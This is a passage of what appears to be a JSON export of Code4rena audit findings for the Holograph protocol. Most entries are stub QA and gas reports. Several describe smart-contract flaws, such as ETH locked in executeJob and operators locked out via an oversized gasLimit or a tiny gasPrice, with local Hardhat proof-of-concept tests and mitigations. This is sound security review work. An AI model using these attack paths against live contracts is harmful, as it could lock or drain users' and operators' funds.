layer-zero endpoint being compromised, which confines the risk quite a bit, so using a normally unrecommended source of randomness could be acceptable here, considering the tradeoffs of integrating a decentralized oracle."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/425", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xSmartContract-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/422", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rotcivegaf-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/420", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/nicobevi-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/419", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rotcivegaf-G.md)."}, {"title": "It is possible that operator loses sent ETH after calling `HolographOperator` contract's `executeJob` function", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/418", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478   # Vulnerability details  ## Impact ETH can be sent when calling the `HolographOperator` contract's `executeJob` function, which can execute the following code. ```solidity File: contracts\\HolographOperator.sol 419:     try 420:       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}( 421:         msg.sender, 422:         bridgeInRequestPayload 423:       ) 424:     { 425:       /// @dev do nothing 426:     } catch { 427:       _failedJobs[hash] = true; 428:       emit FailedOperatorJob(hash); 429:     } ```  Executing the `try ... {...} catch {...}` code mentioned above will execute `HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(...)`. Calling the `nonRevertingBridgeCall` function can possibly execute `revert(0, 0)` if the external call to the bridge contract is not successful. When this occurs, the code in the `catch` block of the `try ... {...} catch {...}` code mentioned above will run, which does not make calling the `executeJob` function revert. As a result, even though the job is not successfully executed, the sent ETH is locked in the `HolographOperator` contract since there is no other way to transfer such sent ETH out from this contract. In this situation, the operator that calls the `executeJob` function will lose the sent ETH.  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 ```solidity   function executeJob(bytes calldata bridgeInRequestPayload) external payable {          ...      /**      * @dev execute the job      */     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     }     /**      * @dev every executed job (even if failed) increments total message counter by one      */     ++_inboundMessageCounter;     /**      * @dev reward operator (with HLG) for executing the job      * @dev this is out of scope and is purposefully omitted from code      */     ////  _bondedOperators[msg.sender] += reward;   } ```  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478 ```solidity   function nonRevertingBridgeCall(address msgSender, bytes calldata payload) external payable {     require(msg.sender == address(this), \"HOLOGRAPH: operator only call\");     assembly {       /**        * @dev remove gas price from end        */       calldatacopy(0, payload.offset, sub(payload.length, 0x20))       /**        * @dev hToken recipient is injected right before making the call        */       mstore(0x84, msgSender)       /**        * @dev make non-reverting call        */       let result := call(         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value         mload(sub(payload.length, 0x40)),         /// @dev destination is bridge contract         sload(_bridgeSlot),         /// @dev any value is passed along         callvalue(),         /// @dev data is retrieved from 0 index memory position         0,         /// @dev everything except for last 32 bytes (gas limit) is sent         sub(payload.length, 0x40),         0,         0       )       if eq(result, 0) {         revert(0, 0)       }       return(0, 0)     }   } ```  ## Proof of Concept First, please add the following `OperatorAndBridgeMocks.sol` file in `src\\mock\\`. ```solidity pragma solidity 0.8.13;  // OperatorMock contract simulates the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions contract OperatorMock {     bool public isJobExecuted = true;      BridgeMock bridgeMock = new BridgeMock();      // testExecuteJob function here simulates the logic flow used in HolographOperator.executeJob function     function testExecuteJob() external payable {         try IOperatorMock(address(this)).testBridgeCall{value: msg.value}() {         } catch {             isJobExecuted = false;         }     }          // testBridgeCall function here simulates the logic flow used in HolographOperator.nonRevertingBridgeCall function     function testBridgeCall() external payable {         // as a simulation, the external call that sends ETH to bridgeMock contract will revert         (bool success, ) = address(bridgeMock).call{value: msg.value}(\"\");         if (!success) {             assembly {                 revert(0, 0)             }         }         assembly {             return(0, 0)         }     } }  interface IOperatorMock {     function testBridgeCall() external payable; }  contract BridgeMock {     receive() external payable {         revert();     } } ```  Then, please add the following `POC.ts` file in `test\\`. ```typescript import { expect } from \"chai\"; import { ethers } from \"hardhat\";  describe('POC', () => {     it(\"It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function\", async () => {         // deploy operatorMock contract that simulates         //   the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions         const OperatorMockFactory = await ethers.getContractFactory('OperatorMock');         const operatorMock = await OperatorMockFactory.deploy();         await operatorMock.deployed();          await operatorMock.testExecuteJob({value: 500});          // even though the job is not successfully executed, the sent ETH is locked in operatorMock contract         const isJobExecuted = await operatorMock.isJobExecuted();         expect(isJobExecuted).to.be.eq(false);         expect(await ethers.provider.getBalance(operatorMock.address)).to.be.eq(500);     }); }); ```  Last, please run `npx hardhat test test/POC.ts --network hardhat`. The `It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function` test will pass to demonstrate the described scenario.  ## Tools Used VSCode  ## Recommended Mitigation Steps In the `catch` block of the `try ... {...} catch {...}` code mentioned above in the Impact section, the code can be updated to transfer the `msg.value` amount of ETH back to the operator, which is `msg.sender` for the `HolographOperator` contract's `executeJob` function, when this described situation occurs."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/416", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/peiw-G.md)."}, {"title": "An attacker can lock operator out of the pod by setting gas limit that's higher than the block gas limit of dest chain", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/414", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L415   # Vulnerability details   When a beaming job is executed, there's a requirement that the gas left would be at least as the `gasLimit` set by the user. Given that there's no limit on the `gasLimit` the user can set, a user can set the `gasLimit` to amount that's higher than the block gas limit on the dest chain, causing the operator to fail to execute the job.  ## Impact Operators would be locked out of the pod, unable to execute any more jobs and not being able to get back the bond they paid.  The attacker would have to pay a value equivalent to the gas fee if that amount was realistic (i.e. `gasPrice` * `gasLimit` in dest chain native token), but this can be a relative low amount for Polygon and Avalanche chain (for Polygon that's 20M gas limit and 200 Gwei gas = 4 Matic, for Avalanche the block gas limit seems to be 8M and the price ~30 nAVAX = 0.24 AVAX ). Plus, the operator isn't going to receive that amount.  ## Proof of Concept The following test demonstrates this scenario:  ```diff diff --git a/test/06_cross-chain_minting_tests_l1_l2.ts b/test/06_cross-chain_minting_tests_l1_l2.ts index 1f2b959..a1a23b7 100644 --- a/test/06_cross-chain_minting_tests_l1_l2.ts +++ b/test/06_cross-chain_minting_tests_l1_l2.ts @@ -276,6 +276,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              gasLimit: TESTGASLIMIT,            })          ); +        estimatedGas = BigNumber.from(50_000_000);          // process.stdout.write('\\n' + 'gas estimation: ' + estimatedGas.toNumber() + '\\n');            let payload: BytesLike = await l1.bridge.callStatic.getBridgeOutRequestPayload( @@ -303,7 +304,8 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              '0x' + remove0x((await l1.operator.getMessagingModule()).toLowerCase()).repeat(2),              payload            ); - +        estimatedGas = BigNumber.from(5_000_000); +                  process.stdout.write(' '.repeat(10) + 'expected lz gas to be ' + executeJobGas(payload, true).toString());          await expect(            adminCall(l2.mockLZEndpoint.connect(l2.lzEndpoint), l2.lzModule, 'lzReceive', [ @@ -313,7 +315,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              payload,              {                gasPrice: GASPRICE, -              gasLimit: executeJobGas(payload), +              gasLimit: 5_000_000,              },            ])          ) ```  The test would fail with the following output:  ```   1) Testing cross-chain minting (L1 & L2)        Deploy cross-chain contracts via bridge deploy          hToken            deploy l1 equivalent on l2:      VM Exception while processing transaction: revert HOLOGRAPH: not enough gas left ```  ## Recommended Mitigation Steps Limit the `gasLimit` to the maximum realistic amount that can be used on the dest chain (including the gas used up to the point where it's checked)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/405", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rbserver-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/399", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Metatron-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/397", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/394", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Aymen0909-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/392", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Aymen0909-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/391", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/i_got_hacked-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/389", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/sakshamguruji-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/387", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/aysha-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/380", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/delfin454000-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/378", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/delfin454000-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/376", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ryshaw-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/371", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/B2-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/370", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/JrNet-G.md)."}, {"title": "If user sets a low `gasPrice` the operator would have to choose between being locked out of the pod or executing the job anyway", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/364", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L202-L340 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L593-L596 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L277-L294   # Vulnerability details  During the beaming process the user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via `hToken`. The amount he has to pay is determined according to the `gasPrice` set by the user, which is supposed to be the maximum gas price to be used on dest chain (therefore predicting the max gas fee the operator would pay and paying him the same value in src chain native tokens). However, in case the user sets a low price (as low as 1 wei) the operator can't skip the job because he's locked out of the pod till he executes the job. The operator would have to choose between loosing money by paying a higher gas fee than he's compensated for or being locked out of the pod - not able to execute additional jobs or get back his bonded amount.   ## Impact Operator would be loosing money by having to pay gas fee that's higher than the compensation (gas fee can be a few dozens of USD for heavy txs). This could also be used by attackers to make operators pay for the attackers' expensive gas tasks: * They can deploy their own contract as the 'source contract' * Use the `bridgeIn` event and the `data` that's being sent to it to instruct the source contract what operations need to be executed * They can use it for execute operations where the `tx.origin` doesn't matter (e.g. USDc gasless send)  ## Proof of Concept * An operator can't execute any further jobs or leave the pod till the job is executed. From [the docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#:~:text=When%20an%20operator%20is%20selected%20for%20a%20job%2C%20they%20are%20temporarily%20removed%20from%20the%20pod%2C%20until%20they%20complete%20the%20job.%20If%20an%20operator%20successfully%20finalizes%20a%20job%2C%20they%20earn%20a%20reward%20and%20are%20placed%20back%20into%20their%20selected%20pod.): > When an operator is selected for a job, they are temporarily removed from the pod, until they complete the job. If an operator successfully finalizes a job, they earn a reward and are placed back into their selected pod. * Operator can't skip a job. Can't prove a negative but that's pretty clear from reading the code. * There's indeed a third option - that some other operator/user would execute the job instead of the selected operator, but a) the operator would get slashed for that. b) If the compensation is lower than the gas fee then other users have no incentive to execute it as well.  ## Recommended Mitigation Steps  Allow operator to opt out of executing the job if the `gasPrice` is higher than the current gas price"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/363", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/B2-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/362", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Dinesh11G-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/361", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/djxploit-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/360", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Pheonix-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/358", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/lukris02-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/356", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/svskaushik-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/355", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/svskaushik-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/350", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/halden-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/343", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Tomio-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/333", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Waze-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/330", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/__141345__-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/329", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/__141345__-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/328", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Waze-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/327", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/cryptostellar5-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/326", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/pedr02b2-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/324", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Diana-Q.md)."}, {"title": "Bond tokens (HLG) can get permanently stuck in operator", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/322", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L849-L857   # Vulnerability details  ## Impact Bond tokens (HLG) equal to the slash amount will get permanently stuck in the HolographOperator each time a job gets executed by someone who is not an (fallback-)operator.  ## Proof of Concept The `HolographOperator.executeJob` function can be executed by anyone after a certain passage of time:  ```js ... if (job.operator != address(0)) {     ...     if (job.operator != msg.sender) {         //perform time and gas price check         if (timeDifference < 6) {             // check msg.sender == correct fallback operator         }         // slash primary operator         uint256 amount = _getBaseBondAmount(pod);         _bondedAmounts[job.operator] -= amount;         _bondedAmounts[msg.sender] += amount;          //determine if primary operator retains his job         if (_bondedAmounts[job.operator] >= amount) {             ...         } else {             ...         }     } } // execute the job ``` In case `if (timeDifference < 6) {` gets skipped, the slashed amount will be assigned to the `msg.sender` regardless if that sender is currently an operator or not. The problem lies within the fact that if `msg.sender` is not already an operator at the time of executing the job, he cannot become one after, to retrieve the reward he got for slashing the primary operator. This is because the function `HolographOperator.bondUtilityToken` requires `_bondedAmounts` to be 0 prior to bonding and hence becoming an operator:  ```js require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, \"HOLOGRAPH: operator is bonded\"); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Assuming that it is intentional that non-operators can execute jobs (which could make sense, so that a user could finish a bridging process on his own, if none of the operators are doing it): remove the requirement that `_bondedAmounts` need to be 0 prior to bonding and becoming an operator so that non-operators can get access to the slashing reward by unbonding after.  Alternatively (possibly preferrable), just add a method to withdraw any `_bondedAmounts` of non-operators."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/316", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/hxzy-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/315", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ch0bu-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/314", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/oyc_109-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/313", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "selected for report", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/oyc_109-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/312", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/peanuts-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/311", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/cryptostellar5-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/308", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Mukund-G.md)."}, {"title": "Wrong slashing calculation rewards for operator that did not do his job", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/307", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382   # Vulnerability details  ## Impact  Wrong slashing calculation may create unfair punishment for operators that accidentally forgot to execute their job.  ## Proof of Concept  [Docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification): If an operator acts maliciously, a percentage of their bonded HLG will get slashed. Misbehavior includes (i) downtime, (ii) double-signing transactions, and (iii) abusing transaction speeds. 50% of the slashed HLG will be rewarded to the next operator to execute the transaction, and the remaining 50% will be burned or returned to the Treasury.  The docs also include a guide for the number of slashes and the percentage of bond slashed. However, in the contract, there is no slashing of percentage fees. Rather, the whole _getBaseBondAmount() fee is [slashed from the job.operator instead.](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)  ```         uint256 amount = _getBaseBondAmount(pod);         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Documentation states that only a portion should be slashed and the number of slashes should be noted down.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Implement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/301", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Diana-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/300", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Jeiwan-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/299", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ReyAdmirado-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/298", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ReyAdmirado-G.md)."}, {"title": "Source contract can steal NFTs from users", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/290", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577   # Vulnerability details  ## Impact A source contract can burn and 